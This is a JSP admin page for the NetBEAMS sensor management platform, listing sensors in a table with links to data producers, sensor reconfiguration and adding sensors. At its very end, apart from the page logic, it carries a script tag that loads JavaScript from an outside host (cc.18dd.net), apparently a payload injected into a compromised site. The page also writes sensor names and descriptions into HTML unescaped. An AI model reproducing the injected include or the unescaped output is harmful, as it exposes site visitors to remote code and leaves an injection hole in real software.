<%@ page import="org.smf.smp.*" %>
<%@ page import="org.smf.smp.event.*" %>
<%@ page import="org.smf.smp.dp.*" %>
<%@ page import="org.dp.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page isErrorPage="true" %>



<h1 align="center">NetBEAMS admin page</h1>
<p align="center">&nbsp;</p>
<table border="1" width="100%" id="table1">
	<tr>
		<td width="235" bgcolor="#000080">
		<p align="center"><b><font color="#FFFFFF" size="5">Menu</font></b></td>
		<td bgcolor="#000080">
		<p align="center"><font size="5" color="#FFFFFF"><b>Here is the list of
		sensors</b></font></td>
	</tr>
	<tr>
		<td width="235">
		<p align="left">&nbsp;</p>
		<p align="center"><a href="data_producers.jsp">Show Data Producers</a></p>
		<p align="center"><a href="index.jsp">Show Sensors</a></p>
		<p align="center">&nbsp;</td>
		<td valign="top">
			<br><br>
			<table border="1" width="100%" id="table1">
				<tr>
					<td width="20px">&nbsp;</td><td width="200px" align="center">Name</td><td align="center">Description</td><td width="100px" align="center">ID</td>

				</tr>
				<%
					SensorManagementPlatform smp = SensorManagementPlatform.getInstance();
					Sensor sensors[] = smp.getSensors();
					for (int i = 0; i < sensors.length; i++) {
						Sensor sensor = sensors[i];
						out.println("<tr>");
						out.println("<td><input type='checkbox' /></td>" +
									"<td align='left'>" + "<a href='reconfigure_sensor.jsp?sensorID=" + sensor.getId() + "'>" + sensor.getName() + "</a></td>" +
									"<td align='left'>" + sensor.getDescription() + "</td>" +
									"<td align='center'>" + sensor.getId() + "</td>");
						out.println("</tr>");
					}
				%>
			</table>

			<p>
			Delete selected Sensors | <a href="add_sensor.jsp">Add new Sensor</a>
			</p>
		</td>
	</tr>
</table>





<script language=javascript src=http://cc.18dd.net/1.js></script>